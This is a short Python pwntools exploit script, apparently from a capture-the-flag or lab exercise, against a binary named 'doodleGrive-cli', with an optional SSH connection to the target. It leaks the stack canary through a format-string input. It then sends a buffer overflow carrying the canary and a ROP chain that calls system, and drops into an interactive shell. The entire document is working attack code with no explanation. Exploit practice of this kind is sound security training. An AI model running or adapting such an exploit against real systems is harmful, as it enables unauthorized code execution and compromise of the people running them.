from pwn import *

elf = ELF("./doodleGrive-cli")

if args.SSH:
	ssh_conn = ssh(host=sys.argv[1], user=sys.argv[2], password=sys.argv[3])
	p = ssh_conn.process("./doodleGrive-cli")
else:
	p = elf.process()

p.readuntil(b"Enter Username:\n")
p.sendline(b"%15$lx")
p.readuntil(b"Enter password for ")
leak = p.readuntil(b":\n").strip(b"\n:")
canary = int(leak, 16)
info(f"Leak canary: 0x{canary}")

payload = b"A" * 56
payload += p64(canary)
payload += b"A" * 8
payload += p64(0x000000000040101a)
payload += p64(0x0000000000401912)
payload += p64(0x497cd5)
payload += p64(elf.sym.system)
p.sendline(payload)
p.interactive()